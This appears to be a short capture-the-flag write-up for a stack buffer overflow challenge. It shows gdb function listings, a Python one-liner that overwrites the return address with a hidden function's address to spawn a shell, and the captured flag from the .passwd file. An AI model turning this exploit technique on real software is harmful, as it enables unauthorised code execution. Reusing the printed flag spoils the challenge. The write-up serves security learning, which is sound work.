```(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400498  _init
0x00000000004004c0  strlen@plt
0x00000000004004d0  printf@plt
0x00000000004004e0  execve@plt
0x00000000004004f0  __isoc99_scanf@plt
0x0000000000400500  _start
0x0000000000400530  _dl_relocate_static_pie
0x0000000000400540  deregister_tm_clones
0x0000000000400570  register_tm_clones
0x00000000004005b0  __do_global_dtors_aux
0x00000000004005e0  frame_dummy
0x00000000004005e7  callMeMaybe
0x0000000000400628  main
0x0000000000400690  __libc_csu_init
0x0000000000400700  __libc_csu_fini
0x0000000000400704  _fini
(gdb) 
```
We need to overwrite **RIP** with the address **0x00000000004005e7**.
```
app-systeme-ch35@challenge03:~$ (python -c 'print "A" * 280 + "\xe7\x05\x40\x00\x00\x00"' && cat -) | ./ch35 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
cat .passwd
B4sicBufferOverflowExploitation
```


--------------------------------------------------------------------------------
### Resources

[Buffer Overflow buffer length - Stack Overflow](https://stackoverflow.com/questions/29594482/buffer-overflow-buffer-length)